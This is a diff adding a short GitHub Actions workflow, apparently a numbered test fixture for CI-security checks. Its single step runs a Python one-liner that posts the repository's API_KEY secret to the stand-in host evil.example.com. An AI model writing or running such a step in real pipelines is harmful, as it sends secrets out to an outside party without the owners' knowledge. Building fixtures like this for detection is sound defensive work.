@@ -1,0 +1,10 @@
+name: P19-python-direct
+on: workflow_dispatch
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    steps:
+      - run: |
+          python -c 'import requests; requests.post("https://evil.example.com", data={"key": "${{ secrets.API_KEY }}"})'
